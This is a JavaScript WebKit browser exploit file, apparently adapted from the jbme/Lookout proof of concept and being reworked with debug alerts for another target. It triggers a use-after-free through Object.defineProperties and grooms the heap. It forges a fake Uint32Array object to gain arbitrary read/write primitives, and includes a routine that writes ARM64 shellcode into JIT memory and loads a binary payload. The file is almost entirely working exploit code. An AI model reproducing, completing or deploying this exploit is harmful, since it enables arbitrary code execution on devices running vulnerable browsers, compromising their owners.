
// Based on https://jbme.qwertyoruiop.com/
// and lookout PoC code.
 var mem0 = 0;
 var mem1 = 0;
 var mem2 = 0;
 var pressure = new Array(100);
 var bufs = new Array(100);
 var print = alert;
 _dview = null;

 var trycatch = "";
 for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
 var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x10)

 function read4(addr) {
 	mem0[4] = addr;
 	var ret = mem2[0];
 	mem0[4] = mem1;
 	return ret;
 }

 function write4(addr, val) {
 	mem0[4] = addr;
 	mem2[0] = val;
 	mem0[4] = mem1;
 }


 // This code seems to be taken from a PoC for PSA-2013-0903.
 // wraps two uint32s into double precision
 function u2d(low, hi) {
 	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
 	_dview.setUint32(0, hi);
 	_dview.setUint32(4, low);
 	return _dview.getFloat64(0);
 }

// dgc attempts to trigger a garbage collection by allocating a large amount of memory
function dgc() {
 	for (var i = 0; i < pressure.length; i++) {
 		pressure[i] = new Uint32Array(0x10000);
 	}
 	for (var i = 0; i < pressure.length; i++) {
 		pressure[i] = 0;
 	}
 }


 function allocbufptrs() {
 	if (bufs[0]) return;
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
 	dgc();
	 
	// Create 0x200 FFFF:0000:4141:4141 integer objects
 	for (i = 0; i < bufs.length; i++) {
 		bufs[i] = new Uint32Array(0x100 * 2)
 		for (k = 0; k < bufs[i].length;) {
 			bufs[i][k++] = 0x41414141;
 			bufs[i][k++] = 0xffff0000;
 		}
 	}
 }

 function smashed(stl) {
	alert("Arbitrary code execution here.")
	return 0;
	 
 	document.body.innerHTML = "win! " + smsh.length;
 	var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
 	write4(jitf, 0xd28024d0);
 	write4(jitf + 4, 0x58000060);
 	write4(jitf + 8, 0xd4001001);
 	write4(jitf + 12, 0xd65f03c0);
 	write4(jitf + 16, jitf + 0x20);
 	write4(jitf + 20, 1);
 	fc();
 	var dyncache = read4(jitf + 0x20);
 	var dyncachev = read4(jitf + 0x20);
 	var go = 1;
 	while (go) {
 		if (read4(dyncache) == 0xfeedfacf) {
 			for (i = 0; i < 0x1000 / 4; i++) {
 				if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
 				{
 					go = 0;
 					break;
 				}
 			}
 		}
 		dyncache += 0x1000;
 	}
 	dyncache -= 0x1000;
 	var bss = [];
 	var bss_size = [];
 	for (i = 0; i < 0x1000 / 4; i++) {
 		if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
 			bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
 			bss_size.push(read4(dyncache + i * 4 + (0x28)));
 		}
 	}
 	var shc = jitf;
 	var filestream = load_binary_resource("loader")
 	for (var i = 0; i < filestream.length;) {
 		var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
 		write4(shc, word);
 		shc += 4;
 		i += 4;
 	}
 	jitf &= ~0x3FFF;
 	jitf += 0x8000;
 	write4(shc, jitf);
 	write4(shc + 4, 1);
 	// copy macho
 	for (var i = 0; i < shll.length; i++) {
 		write4(jitf + i * 4, shll[i]);
 	}
 	alert("All set. Close this alert and lock your screen to continue. See you on the other side!")
 	for (var i = 0; i < bss.length; i++) {
 		for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
 			write4(bss[i] + k * 4, 0);
 		}
 	}
 	fc();
 	alert(2);
 }

 function go() {
 	dgc();
 	setTimeout(go_, 400);
 }

 function go_() {
 	if (smsh.length != 0x10) {
 		smashed();
 		return;
 	}
 	dgc();
 	var arr = new Array(0x100);
 	var yolo = new ArrayBuffer(0x1000);
 	arr[0] = yolo;
 	arr[1] = 0x13371337;
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
 		props["stale"]["value"] = null;
 		allocbufptrs();
 		return 10;
 	};
 	var props = {
 		p0: {value: 0},
 		p1: {value: 1},
 		p2: {value: 2},
 		p3: {value: 3},
 		p4: {value: 4},
 		p5: {value: 5},
 		p6: {value: 6},
 		p7: {value: 7},
 		p8: {value: 8},
 		length: {value: not_number},
 		stale: {value: arr},
 		after: {value: 666}
 	};
 	var target = [];
 	var stale = 0;
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
 	stale = target.stale;
 	
	 
	if(before_len != stale.length){
		alert("Exploit Worked v2");
	} else {
		alert("Exploit Failed");
		return;
	}
	 
	stale[0] += 0x101;
 	stale[1] = {}
	 
	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
	// This will force JS to create a r/w/x block of memory, with raw machine code,
	// this block can then be written to.
 	//for (var z = 0; z < 0x1000; z++) fc();
	//alert("After jitted code");
	 
 	for (i = 0; i < bufs.length; i++) {
 		for (k = 0; k < bufs[0].length; k++) {
			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if (bufs[i][k] == 0x41414242) { 
				//alert("Found the object!!");
				
 				// Leak function pointer
				//stale[0] = fc;
 				//fcp = bufs[i][k];
				//alert("Leaked function pointer:" + fcp)
				
                       		bufs.push(stale);
				alert("Pushed stale");
				
				structID = 100;
				stale[0] = {
				    'a': u2d(structID, 0), // the JSObject properties
				    'b': u2d(0, 0),
				    'c': smsh, // var smsh = new Uint32Array(0x10)
				    'd': u2d(0x100, 0)
				}
				stale[1] = stale[0];
				bufs[i][k] += 0x10;
				while(!(stale[0] instanceof Uint32Array)) {
				    structID++;
				    stale[1]['a'] = u2d(structID, 0);
				    //alert(structID);
				}
				alert('found structID for Uint32Array = '+structID);
				alert('stale[0] is now: '+stale[0]);
				
				// Make a fake Uint32Array
 				stale[0] = {
					// 'a' is the forged JSCell header
					// m_structureID = 105 // Struct ID for Uint32ArrayType (Changes on runtime, how did this work?)
					// m_indexingType = 0x0
					// m_type = 0x26 // Assumingly Uint32ArrayType on the version of webkit this was made on.
					// m_flags = 0x72
					// m_gcData (or m_cellState?) = 0x11
 					'a': u2d(105, 0x1172600),
					
					// 'b' - 'd' are the forged JSArrayBufferView
 					'b': u2d(0, 0),		// butterfly ptr (Does this exist on the version of wk the switch is using?)
 					'c': smsh,		// void* m_vector
 					'd': u2d(0x100, 0)	// uint32_t m_length;
 				}
				//alert("Created fake obj in stale[0]");

				// Why do this? VVV
 				stale[1] = stale[0]
				//alert("set stale[1] = stale[0]");
				
				// ORIGINAL COMMENT: misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
				// MY COMMENT: Offset by 16 bytes to get past the JSCell inheirited fields.
				// JSCell:
				//	uint32: StructureID m_structureID;
				//	uint8:	IndexingType m_indexingType;
				//	uint8:	JSType m_type;
				//	uint8:	TypeInfo::InlineTypeFlags m_flags;
				//	uint8:	uint8_t m_gcData;
				
				alert("About to try weird thingy");
				stale[0] = stale[1]['a'];
				alert("Raw JSCell:" + bufs[i][k].toString(16));
				
				//ORIGINAL: bufs[i][k] += 0x10; 
				bufs[i][k] += 0x8; 
				alert("Offset bufs[i][k] by 8");
				
				try{
					alert(stale[0]);
					alert(stale[0] instanceof Uint32Array);
				}
				catch(e){
					alert("Exp:" + e.message);
				}
				alert("After catch");
				
				if (stale[0] instanceof Uint32Array){
					alert("Got proper Uint32Array!");
				} else if (stale[0] instanceof Float32ArrayType){
					alert("Got Float32ArrayType!");
				} else if (stale[0] instanceof Float64ArrayType){
					alert("Got Float64ArrayType!");
				} else if (stale[0] instanceof DataViewType){
					alert("Got DataViewType!");
				} else {
					alert("Couldn't find valid type");
				}
				
				alert("After else if block");
				
				
				
				/*
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
 				stale[0][6] = 0xffffffff;
 				mem0 = stale[0];
 				mem1 = bck;
 				mem2 = smsh;
 				bufs.push(stale)
				
				//function read4(addr) {
 				//mem0[4] = addr;
 				//var ret = mem2[0];
 				//mem0[4] = mem1;
 				//return ret;
				//}
 				if (smsh.length != 0x10) {
 					smashed(stale[0]);
 				}
				*/
 				return;
 			}
 		}
 	}
	alert("Done executing. Did anything happen?")
 	//document.location.reload();
 }

go();
